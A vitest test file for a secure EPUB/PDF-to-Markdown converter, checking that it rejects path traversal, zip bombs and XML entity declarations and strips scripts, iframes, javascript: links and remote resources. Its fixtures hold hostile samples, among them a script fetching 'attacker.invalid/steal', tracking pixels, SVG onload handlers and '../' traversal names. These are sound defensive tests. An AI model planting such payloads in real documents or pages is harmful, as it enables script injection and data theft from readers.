import { describe, expect, it } from 'vitest'
import { strFromU8, strToU8, unzipSync, zipSync } from 'fflate'
import { openSecureArchive } from '../core/archive'
import { convertDocument, convertEpub } from '../core/convert'
import { SecurityError } from '../core/errors'
import { resolveArchiveReference, validateArchiveEntryName } from '../core/path'
import { sanitizeSvg } from '../core/svg'
import { parseXmlSecure } from '../core/xml'
import { makeEpub } from './fixtures'
import { makePdf } from './pdf-fixture'

describe('archive path hardening', () => {
  it.each(['../evil.txt', '/absolute.txt', 'C:/windows.txt', 'safe\\evil.txt', 'a//b.txt'])(
    'rejects unsafe entry %s',
    (path) => expect(() => validateArchiveEntryName(path)).toThrow(SecurityError),
  )

  it('resolves a legal parent reference without escaping the archive', () => {
    expect(resolveArchiveReference('OEBPS/Text', '../Images/cover.png')).toBe('OEBPS/Images/cover.png')
  })

  it('rejects a reference that escapes the archive root', () => {
    expect(() => resolveArchiveReference('OEBPS', '../../outside')).toThrow(SecurityError)
  })

  it('rejects case-insensitive duplicate archive names', () => {
    const archive = zipSync({ 'Text/A.txt': strToU8('a'), 'text/a.txt': strToU8('b') })
    expect(() => openSecureArchive(archive)).toThrow(/duplicate file paths/u)
  })

  it('rejects extreme compression ratios before extraction', () => {
    const archive = zipSync({ bomb: new Uint8Array(5_000_000) }, { level: 9 })
    expect(() => openSecureArchive(archive)).toThrow(/suspicious compression ratio/u)
  })
})

describe('XML hardening', () => {
  it('rejects DTD and entity declarations', () => {
    const xml = strToU8('<!DOCTYPE x [<!ENTITY boom "boom">]><x>&boom;</x>')
    expect(() => parseXmlSecure(xml, 'Test XML')).toThrow(/forbidden DTD or entity/u)
  })
})

describe('secure EPUB conversion', () => {
  it('converts a normal EPUB into a Markdown bundle', () => {
    const result = convertEpub(makeEpub(), 'test.epub')
    const output = unzipSync(result.archive)
    const book = strFromU8(output['book.md']!)

    expect(book).toContain('# Sicheres Testbuch')
    expect(book).toContain('![Cover](assets/001-cover.png)')
    expect(Object.keys(output)).toContain('chapters/001-Kapitel Eins.md')
    expect(Object.keys(output)).toContain('SECURITY-REPORT.md')
  })

  it('removes active elements, remote resources and unsafe links', () => {
    const maliciousChapter = `<!doctype html><html><body>
      <h1>Kapitel</h1>
      <script>fetch('https://attacker.invalid/steal')</script>
      <iframe src="https://attacker.invalid/frame"></iframe>
      <p><a href="javascript:alert(1)">Nicht klicken</a></p>
      <img src="https://attacker.invalid/pixel" alt="Tracker" />
      <p>Text mit https://attacker.invalid/plain</p>
    </body></html>`
    const result = convertEpub(makeEpub({ chapter: maliciousChapter }), 'dubios.epub')
    const book = strFromU8(unzipSync(result.archive)['book.md']!)

    expect(book).toContain('Nicht klicken')
    expect(book).toContain('[external URL removed]')
    expect(book).not.toMatch(/<script|<iframe|javascript:|attacker\.invalid/iu)
    expect(result.summary.warnings.length).toBeGreaterThan(0)
  })

  it('rejects entity declarations inside XHTML chapters', () => {
    const chapter = '<!DOCTYPE html [<!ENTITY x "boom">]><html><body><p>&x;</p></body></html>'
    expect(() => convertEpub(makeEpub({ chapter }), 'entity.epub')).toThrow(/forbidden entity/u)
  })

  it('accepts and strips an inert legacy XHTML doctype', () => {
    const chapter = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
      <html xmlns="http://www.w3.org/1999/xhtml"><body><h1>Legacy chapter</h1><p>Still safe.</p></body></html>`
    const result = convertEpub(makeEpub({ chapter }), 'legacy.epub')
    const book = strFromU8(unzipSync(result.archive)['book.md']!)

    expect(book).toContain('# Legacy chapter')
    expect(result.summary.warnings).toContain('Removed an inert legacy document type from "chapter".')
  })

  it('sanitizes inline SVG instead of dropping it', () => {
    const chapter = `<html><body><h1>Illustrated</h1>
      <svg viewBox="0 0 20 20" onload="alert(1)"><title>Diagram</title><path d="M0 0 L20 20"/><script>alert(1)</script></svg>
    </body></html>`
    const result = convertEpub(makeEpub({ chapter }), 'inline-svg.epub')
    const output = unzipSync(result.archive)
    const book = strFromU8(output['book.md']!)
    const svgPath = Object.keys(output).find((path) => path.endsWith('.svg'))

    expect(book).toMatch(/!\[Diagram\]\(assets\/\d+-inline-Diagram\.svg\)/u)
    if (!svgPath) throw new Error('Expected a sanitized inline SVG asset')
    const svg = output[svgPath]
    if (!svg) throw new Error('Expected the inline SVG asset to exist in the export')
    expect(strFromU8(svg)).not.toMatch(/script|onload|alert/iu)
  })

  it('converts SVG files used directly in the EPUB reading order', () => {
    const packageXml = `<?xml version="1.0" encoding="UTF-8"?>
      <package xmlns="http://www.idpf.org/2007/opf" version="3.0">
        <metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Visual book</dc:title></metadata>
        <manifest>
          <item id="page" href="page.svg" media-type="image/svg+xml"/>
          <item id="cover" href="cover.png" media-type="image/png"/>
        </manifest>
        <spine><itemref idref="page"/></spine>
      </package>`
    const page = strToU8('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="cover.png" width="10" height="10"/></svg>')
    const result = convertEpub(makeEpub({ packageXml, extraFiles: { 'OEBPS/page.svg': page } }), 'visual.epub')
    const output = unzipSync(result.archive)

    expect(strFromU8(output['book.md']!)).toContain('](assets/002-page.svg)')
    expect(strFromU8(output['assets/002-page.svg']!)).toContain('href="001-cover.png"')
  })

  it('converts raster images used directly in the EPUB reading order', () => {
    const packageXml = `<?xml version="1.0" encoding="UTF-8"?>
      <package xmlns="http://www.idpf.org/2007/opf" version="3.0">
        <metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Raster book</dc:title></metadata>
        <manifest><item id="cover" href="cover.png" media-type="image/png"/></manifest>
        <spine><itemref idref="cover"/></spine>
      </package>`
    const result = convertEpub(makeEpub({ packageXml }), 'raster.epub')
    const output = unzipSync(result.archive)

    expect(strFromU8(output['book.md']!)).toContain('](assets/001-cover.png)')
  })
})

describe('SVG sanitization', () => {
  it('keeps passive graphics and local raster references while removing active content', () => {
    const source = strToU8(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert(1)">
      <script>alert(1)</script><foreignObject><div>active</div></foreignObject>
      <path d="M0 0 L100 100" stroke="black"/>
      <image href="cover.png" width="100" height="100"/>
      <image href="https://attacker.invalid/pixel"/>
    </svg>`)
    const result = sanitizeSvg(source, 'test SVG', (reference) => reference === 'cover.png' ? '001-cover.png' : null)
    const output = strFromU8(result.content)

    expect(output).toContain('<path')
    expect(output).toContain('href="001-cover.png"')
    expect(output).not.toMatch(/script|foreignObject|onload|attacker|alert/iu)
    expect(result.warnings.length).toBeGreaterThan(0)
  })
})

describe('secure PDF conversion', () => {
  it('extracts text pages into a passive Markdown bundle', async () => {
    const result = await convertDocument(makePdf([['Hallo PDF', 'Zweite Zeile'], ['Seite zwei']]), 'test.pdf')
    const output = unzipSync(result.archive)
    const document = strFromU8(output['document.md']!)

    expect(result.summary.format).toBe('pdf')
    expect(result.summary.units).toBe(2)
    expect(document).toContain('# Test PDF')
    expect(document).toContain('## Page 1')
    expect(document).toContain('Hallo PDF')
    expect(document).toContain('## Page 2')
    expect(Object.keys(output)).toContain('SECURITY-REPORT.md')
  })

  it('neutralizes URLs found in PDF text', async () => {
    const result = await convertDocument(makePdf([['Visit https://attacker.invalid/path now']]), 'links.pdf')
    const document = strFromU8(unzipSync(result.archive)['document.md']!)

    expect(document).toContain('external URL removed')
    expect(document).not.toContain('attacker.invalid')
  })

  it('rejects unknown input formats before parsing', async () => {
    await expect(convertDocument(strToU8('not an ebook'), 'fake.bin')).rejects.toThrow(/neither a supported EPUB nor a PDF/u)
  })
})
